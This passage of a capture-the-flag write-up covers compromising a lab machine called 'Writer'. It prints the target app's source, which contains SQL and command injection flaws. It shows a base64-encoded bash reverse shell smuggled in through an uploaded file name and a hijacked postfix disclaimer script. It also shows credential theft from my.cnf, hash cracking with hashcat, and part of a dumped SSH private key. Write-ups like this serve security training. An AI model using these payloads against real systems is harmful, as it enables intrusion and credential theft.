+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Database Error"</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM users;"</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'users.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+<span class="c1">#Define settings page
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard/settings'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">settings</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Database Error!"</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"SELECT * FROM site WHERE id = 1"</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'settings.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+
+<span class="c1">#Define authentication mechanism
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/administrative'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">,</span> <span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login_page</span><span class="p">():</span>
+    <span class="k">if</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'uname'</span><span class="p">)</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">)</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">connector</span> <span class="o">=</span> <span class="n">connections</span><span class="p">()</span>
+        <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">(</span><span class="s">"Database error"</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+            <span class="n">sql_command</span> <span class="o">=</span> <span class="s">"Select * From users Where username = '%s' And password = '%s'"</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+            <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
+            <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+            <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"Got result"</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">result</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">session</span><span class="p">[</span><span class="s">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'success.html'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="s">"Incorrect credentials supplied"</span>
+                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="s">"Incorrect credentials supplied"</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/logout"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="s">'user'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">'user'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+   <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"0.0.0.0"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now we have the source code of the web app.</p>
+
+<p>There is a vulrable os.system call that takes the user supplied uploaded file name as input. We should be able to get OS Command Injection here.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">):</span>
+            <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'image_url'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">".jpg"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
+                    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"mv {} {}.jpg"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Lets go back to uploading an image from before, but upload an image with a malicious file name.</p>
+
+<p>We’ll start with a classic bash reverse shell payload <code class="language-plaintext highlighter-rouge">/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.56/9001 0&gt;&amp;1"</code> which we will base64 encode to avoid bad characters, then we can base64 decode it and pipe it to bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.54/9001 0&gt;&amp;1  "'</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi
+</code></pre></div></div>
+
+<p>Create our payload.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 <span class="nt">-d</span>|bash
+</code></pre></div></div>
+
+<p>Now we can create our malicious file name. We’ll use semicolons as command separators, and backticks for command substitution and pipe to pipe output to other commands.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> <span class="s2">"1.jpg;</span><span class="sb">`</span><span class="nb">echo</span> <span class="nt">-n</span> L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 <span class="nt">-d</span>|bash<span class="sb">`</span><span class="s2">;"</span>
+</code></pre></div></div>
+
+<p>Upload the file, intercept the request with burp and change the mime type to image/jpeg.</p>
+
+<p><img src="assets/writer_screenshots/burp_image_upload.png" alt="burp_image_upload" /></p>
+
+<p>Start a netcat listener.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9001
+</code></pre></div></div>
+
+<p>Now on the same intercepted request, remove the file name and put the full path to the file in the image_url feild.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:///var/www/writer.htb/writer/static/img/1.jpg<span class="p">;</span><span class="sb">`</span><span class="nb">echo </span>L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTQvOTAwMSAwPiYxICAi|base64 <span class="nt">-d</span>|bash<span class="sb">`</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/burp_image_url.png" alt="burp_image_url" /></p>
+
+<p>The page hangs and we catch a reverse shell.</p>
+
+<p><img src="assets/writer_screenshots/reverse_shell.png" alt="reverse_shell" /></p>
+
+<p>We can get a pty with the python trick.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@writer:/<span class="nv">$ </span>which python
+which python
+www-data@writer:/<span class="nv">$ </span>which python3
+which python3
+/usr/bin/python3
+www-data@writer:/<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+www-data@writer:/<span class="nv">$ </span>^Zfish: Job 1, <span class="s1">'nc -lvnp 9001'</span> has stopped
+tuz@hackbox ~&gt; <span class="nb">stty echo</span> <span class="nt">-raw</span><span class="p">;</span><span class="nb">fg
+</span>Send job 1, “nc <span class="nt">-lvnp</span> 9001” to foreground
+
+
+www-data@writer:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<h2 id="privesc">PrivEsc</h2>
+
+<h2 id="mysql">mySQL</h2>
+
+<p>Lets try poking at the database some more.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/mysql/my.cnf
+</code></pre></div></div>
+
+<pre><code class="language-txt">...snip...
+[client]
+database = dev
+user = djangouser
+password = DjangoSuperPassword
+default-character-set = utf8
+</code></pre>
+
+<p>We found the database creds, lets log in and see what we can get.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> djangouser <span class="nt">-p</span>
+Enter password: DjangoSuperPassword
+
+...snip...
+
+MariaDB <span class="o">[</span>dev]&gt; show databases<span class="p">;</span>
++--------------------+
+| Database           |
++--------------------+
+| dev                |
+| information_schema |
++--------------------+
+2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+
+MariaDB <span class="o">[</span>dev]&gt; use dev
+Database changed
+MariaDB <span class="o">[</span>dev]&gt; show tables<span class="p">;</span>
++----------------------------+
+| Tables_in_dev              |
++----------------------------+
+| auth_group                 |
+| auth_group_permissions     |
+| auth_permission            |
+| auth_user                  |
+| auth_user_groups           |
+| auth_user_user_permissions |
+| django_admin_log           |
+| django_content_type        |
+| django_migrations          |
+| django_session             |
++----------------------------+
+10 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+
+MariaDB <span class="o">[</span>dev]&gt; <span class="k">select</span> <span class="k">*</span> from auth_user<span class="p">;</span>
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+| <span class="nb">id</span> | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+|  1 | pbkdf2_sha256<span class="nv">$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A</span><span class="o">=</span> | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
++----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We found a hashed password for kyle, and we know from the passwd file and the rpc enum from eariler that he’s a user. Lets crack the hash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A='</span> <span class="o">&gt;</span> kyle.hash
+</code></pre></div></div>
+
+<p>Compairing the hash to hashcat example hashes it looks like a Django hash, which is used in Flask as well, lets try that.
+<img src="assets/writer_screenshots/hashcat_examples.png" alt="hashcat_examples" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 10000 kyle.hash /usr/share/wordlists/passwords/rockyou.txt
+</code></pre></div></div>
+
+<p>And we get a password</p>
+
+<pre><code class="language-txt">pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
+</code></pre>
+
+<p><img src="assets/writer_screenshots/hashcat_found_pass.png" alt="hashcat_found_pass" /></p>
+
+<p>Lets try su’ing as kyle now we have a potential password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su kyle
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/su_kyle.png" alt="su_kyle" /></p>
+
+<p>We can now ssh in as kyle for persistant shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh kyle@10.129.212.12
+</code></pre></div></div>
+
+<p>We can get the user flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user.txt
+d..............................4
+</code></pre></div></div>
+
+<h2 id="more-privesc">More PrivEsc</h2>
+
+<p>Kyle is just a user but he’s in the <code class="language-plaintext highlighter-rouge">filter</code> and <code class="language-plaintext highlighter-rouge">smbgroup</code> groups so we’ll see what we can do with that. Lets look into the filter group first.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kyle@writer:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kyle<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kyle<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>kyle<span class="o">)</span>,997<span class="o">(</span>filter<span class="o">)</span>,1002<span class="o">(</span>smbgroup<span class="o">)</span>
+kyle@writer:~<span class="nv">$ </span>find / <span class="nt">-group</span> filter <span class="nt">-ls</span> 2&gt;/dev/null
+    16282      4 <span class="nt">-rwxrwxr-x</span>   1 root     filter       1021 Dec 13 13:50 /etc/postfix/disclaimer
+    16281      4 drwxr-x---   2 filter   filter       4096 May 13  2021 /var/spool/filter
+</code></pre></div></div>
+
+<p>We can edit the postfix disclamer. Lets see what we can do with that.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /etc/postfix/<span class="p">;</span> <span class="nb">grep</span> <span class="nt">-R</span> <span class="nt">-i</span> <span class="s1">'disclaimer'</span>
+disclaimer:# Get disclaimer addresses
+disclaimer:DISCLAIMER_ADDRESSES<span class="o">=</span>/etc/postfix/disclaimer_addresses
+disclaimer:if <span class="o">[</span> <span class="sb">`</span><span class="nb">grep</span> <span class="nt">-wi</span> ^<span class="k">${</span><span class="nv">from_address</span><span class="k">}</span><span class="nv">$ </span><span class="k">${</span><span class="nv">DISCLAIMER_ADDRESSES</span><span class="k">}</span><span class="sb">`</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+</span>disclaimer:                   <span class="nt">--disclaimer</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
+disclaimer:                   <span class="nt">--disclaimer-html</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
+master.cf:  <span class="nv">flags</span><span class="o">=</span>Rq <span class="nv">user</span><span class="o">=</span>john <span class="nv">argv</span><span class="o">=</span>/etc/postfix/disclaimer <span class="nt">-f</span> <span class="k">${</span><span class="nv">sender</span><span class="k">}</span> <span class="nt">--</span> <span class="k">${</span><span class="nv">recipient</span><span class="k">}</span>
+</code></pre></div></div>
+
+<p>Looks like the <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer</code> file is being loaded as an argument when mail is sent.</p>
+
+<p>Lets edit the file, insert a reverse shell payload and then try and send an email.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/postfix/disclaimer
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+<span class="c"># Localize these.</span>
+/bin/bash <span class="nt">-c</span> <span class="s2">"/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.54/9001 0&gt;&amp;1"</span>
+<span class="nv">INSPECT_DIR</span><span class="o">=</span>/var/spool/filter
+<span class="nv">SENDMAIL</span><span class="o">=</span>/usr/sbin/sendmail
+
+<span class="c"># Get disclaimer addresses</span>
+<span class="nv">DISCLAIMER_ADDRESSES</span><span class="o">=</span>/etc/postfix/disclaimer_addresses
+
+<span class="c"># Exit codes from &lt;sysexits.h&gt;</span>
+<span class="nv">EX_TEMPFAIL</span><span class="o">=</span>75
+<span class="nv">EX_UNAVAILABLE</span><span class="o">=</span>69
+
+<span class="c"># Clean up when done or when aborting.</span>
+<span class="nb">trap</span> <span class="s2">"rm -f in.</span><span class="nv">$$</span><span class="s2">"</span> 0 1 2 3 15
+
+<span class="c"># Start processing.</span>
+<span class="nb">cd</span> <span class="nv">$INSPECT_DIR</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="nv">$INSPECT_DIR</span> does not exist<span class="p">;</span> <span class="nb">exit</span>
+<span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="nb">cat</span> <span class="o">&gt;</span><span class="k">in</span>.<span class="nv">$$</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo </span>Cannot save mail to file<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_TEMPFAIL</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="c"># obtain From address</span>
+<span class="nv">from_address</span><span class="o">=</span><span class="sb">`</span><span class="nb">grep</span> <span class="nt">-m</span> 1 <span class="s2">"From:"</span> <span class="k">in</span>.<span class="nv">$$</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"&lt;"</span> <span class="nt">-f</span> 2 | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"&gt;"</span> <span class="nt">-f</span> 1<span class="sb">`</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span><span class="nb">grep</span> <span class="nt">-wi</span> ^<span class="k">${</span><span class="nv">from_address</span><span class="k">}</span><span class="nv">$ </span><span class="k">${</span><span class="nv">DISCLAIMER_ADDRESSES</span><span class="k">}</span><span class="sb">`</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  /usr/bin/altermime <span class="nt">--input</span><span class="o">=</span><span class="k">in</span>.<span class="nv">$$</span> <span class="se">\</span>
+                   <span class="nt">--disclaimer</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
+                   <span class="nt">--disclaimer-html</span><span class="o">=</span>/etc/postfix/disclaimer.txt <span class="se">\</span>
+                   <span class="nt">--xheader</span><span class="o">=</span><span class="s2">"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm"</span> <span class="o">||</span> <span class="se">\</span>
+                    <span class="o">{</span> <span class="nb">echo </span>Message content rejected<span class="p">;</span> <span class="nb">exit</span> <span class="nv">$EX_UNAVAILABLE</span><span class="p">;</span> <span class="o">}</span>
+<span class="k">fi</span>
+
+<span class="nv">$SENDMAIL</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span> &lt;<span class="k">in</span>.<span class="nv">$$</span>
+
+<span class="nb">exit</span> <span class="nv">$?</span>
+</code></pre></div></div>
+
+<p>Start another netcat listener</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9001
+</code></pre></div></div>
+
+<p>Create a python script to send mail</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /dev/shm/send_mail.py
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">smtplib</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">'127.0.0.1'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">25</span>
+
+<span class="n">sender_email</span> <span class="o">=</span> <span class="s">"kyle@writer.htb"</span>
+<span class="n">receiver_email</span> <span class="o">=</span> <span class="s">"kyle@writer.htb"</span>
+<span class="n">message</span> <span class="o">=</span> <span class="s">"""</span><span class="se">\
+</span><span class="s">        Subject: Hi there
+
+
+        Test_python_sender."""</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">server</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">ehlo</span><span class="p">()</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender_email</span><span class="p">,</span> <span class="n">receiver_email</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Run our script and see if we get a shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /dev/shm/send_mail.py
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/john_rev_shell.png" alt="john_rev_shell" /></p>
+
+<p>We caught the reverse shell, we can do the python pty trick again to get a propper pty.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john@writer:/<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+john@writer:/<span class="nv">$ </span>^Z
+fish: Job 1, <span class="s1">'nc -lvnp 9001'</span> has stopped
+tuz@hackbox ~&gt; <span class="nb">stty echo</span> <span class="nt">-raw</span><span class="p">;</span><span class="nb">fg
+</span>Send job 1, “nc <span class="nt">-lvnp</span> 9001” to foreground
+
+john@writer:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+
+<p>We can also read john’s ssh private key and use that to ssh in to the box as john.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john@writer:/home/john<span class="nv">$ </span><span class="nb">cat</span> ~/.ssh/id_rsa
+</code></pre></div></div>
+
+<pre><code class="language-txt">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJz
+wC4+LHoqnJpIdi/qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc/+CHxcTrrw+uIRVIiUuKF
+OznaG7QbqiFE1CsmnNAf7mz4Ci5VfkjwfZr18rduaUXBdNVIzPwNnL48wzF1QHgVnRTCB3
+i76pHSoZEA0bMDkUcqWuI0Z+3VOZlhGp0/v2jr2JH/uA6U0g4Ym8vqgwvEeTk1gNPIM6fg
+9xEYMUw+GhXQ5Q3CPPAVUaAfRDSivWtzNF1XcELH1ofF+ZY44vcQppovWgyOaw2fAHW6ea
+TIcfhw3ExT2VSh7qm39NITKkAHwoPQ7VJbTY0Uj87+j6RV7xQJZqOG0ASxd4Y1PvKiGhke
+tFOd6a2m8cpJwsLFGQNtGA4kisG8m//aQsZfllYPI4n4A1pXi/7NA0E4cxNH+xt//ZMRws
+sfahK65k6+Yc91qFWl5R3Zw9wUZl/G10irJuYXUDAAAFiN5gLYDeYC2AAAAAB3NzaC1yc2
+EAAAGBAMajli2xt+lQaRRM9hDWsNA38DESyXQ90KWiAKadu0r5LbFmN4Tic8AuPix6Kpya
+SHYv6iw508eb/LweuytOH/uBSZdn2FUsMDCK33P/gh8XE668PriEVSIlLihTs52hu0G6oh
+RNQrJpzQH+5s+AouVX5I8H2a9fK3bmlFwXTVSMz8DZy+PMMxdUB4FZ0Uwgd4u+qR0qGRAN
+GzA5FHKlriNGft1TmZYRqdP79o69iR/7gOlNIOGJvL6oMLxHk5NYDTyDOn4PcRGDFMPhoV
+0OUNwjzwFVGgH0Q0or1rczRdV3BCx9aHxfmWOOL3EKaaL1oMjmsNnwB1unmkyHH4cNxMU9
+lUoe6pt/TSEypAB8KD0O1SW02NFI/O/o+kVe8UCWajhtAEsXeGNT7yohoZHrRTnemtpvHK
+ScLCxRkDbRgOJIrBvJv/2kLGX5ZWDyOJ+ANaV4v+zQNBOHMTR/sbf/2TEcLLH2oSuuZOvm
+HPdahVpeUd2cPcFGZfxtdIqybmF1AwAAAAMBAAEAAAGAZMExObg9SvDoe82VunDLerIE+T
+9IQ9fe70S/A8RZ7et6S9NHMfYTNFXAX5sP5iMzwg8HvqsOSt9KULldwtd7zXyEsXGQ/5LM
+VrL6KMJfZBm2eBkvzzQAYrNtODNMlhYk/3AFKjsOK6USwYJj3Lio55+vZQVcW2Hwj/zhH9
+0J8msCLhXLH57CA4Ex1WCTkwOc35sz+IET+VpMgidRwd1b+LSXQPhYnRAUjlvtcfWdikVt
